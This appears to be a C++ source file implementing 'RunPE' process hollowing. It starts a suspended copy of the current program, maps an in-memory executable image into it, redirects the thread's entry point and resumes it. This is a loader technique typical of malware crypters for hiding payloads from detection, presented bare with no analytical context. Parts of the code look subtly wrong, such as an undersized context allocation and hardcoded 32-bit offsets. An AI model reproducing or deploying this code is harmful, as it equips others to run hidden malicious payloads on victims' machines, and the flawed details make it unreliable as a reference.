#include "Execution.h"

int RunPortableExecutable(HANDLE Image) {

	PIMAGE_DOS_HEADER DOSHeader;
	PIMAGE_NT_HEADERS NtHeader;
	PIMAGE_SECTION_HEADER SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFO SI;

	PCONTEXT CTX;

	PSIZE_T ImageBase;
	PVOID pImageBase;

	int count;
	char CurrentFilePath[1024];

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(SIZE_T(Image) + DOSHeader->e_lfanew);

	GetModuleFileName(0, CurrentFilePath, 1024);
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {

		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {

			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {

#ifdef _WIN64
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Rbx + 8), LPVOID(&ImageBase), 4, 0);
#else
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
#endif	

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {

					SectionHeader = PIMAGE_SECTION_HEADER(SIZE_T(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(SIZE_T(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(SIZE_T(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);

				}
#ifdef _WIN64
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Rbx + 8),
#else
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
#endif

					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

#ifdef _WIN64
				CTX->Rax = SIZE_T(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#else
				CTX->Eax = SIZE_T(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
#endif

				SetThreadContext(PI.hThread, LPCONTEXT(CTX));

				ResumeThread(PI.hThread);

				return 0;
			}

			return -1;

		}

		return -1;

	}

	return -1;

}